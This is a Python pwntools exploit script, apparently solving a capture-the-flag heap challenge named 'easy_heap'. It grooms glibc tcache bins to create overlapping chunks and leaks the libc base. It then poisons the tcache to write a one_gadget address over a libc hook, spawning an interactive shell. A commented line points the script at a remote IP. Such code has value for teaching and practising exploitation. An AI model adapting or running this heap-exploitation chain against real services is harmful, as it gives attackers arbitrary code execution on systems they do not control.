from pwn import *
def cmd(c):
	p.sendlineafter("and?\n> ",str(c))
def add(size,data):
	cmd(1)
	p.sendlineafter("size \n> ",str(size))
	p.sendafter("tent \n> ",data)
def show(idx):
	cmd(3)
	p.sendlineafter("dex \n> ",str(idx))
def free(idx):
	cmd(2)
	p.sendlineafter("dex \n> ",str(idx))
p=process("./easy_heap")
#p=remote("10.21.13.100",10003)
#context.log_level='debug'
for x in range(10):
	add(0xf7,'\n')
for x in range(7):
	free(9-x)

free(0)
free(1)
free(2)
#set the presize
for x in range(7):
	add(0xf7,'\n')

add(0x10,'\n')#7
add(0x10,'\n')#8
add(0xf7,'\n')#9
# keep the presize and begin to free
free(8)# protec 
for x in range(6):
	free(x)
#fill tcache
free(7)#into tcache
for x in range(6):
	add(0x10,'\n')
add(0xf8,'\n')#7
for x in range(7):
	free(x)
free(9)
####over laped
for x in range(7):
	add(0x2,'\n')
add(0x2,'\n')#8
show(7)
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7dcfca0-0x7ffff79e4000)
log.warning(hex(base))
add(0x20,'\n')#9
free(1)
free(2)
free(7)
free(0)
gdb.attach(p)
free(9)
add(0x10,p64(0x7ffff7dcfc30-0x7ffff79e4000+base))#0
add(0x10,'\n')#1
add(0x10,'\n')#2
one=base+0x10a38c
add(0x10,p64(one))
p.sendlineafter(">",'1')
p.sendline("clear")
#
p.interactive("nier>>>>")
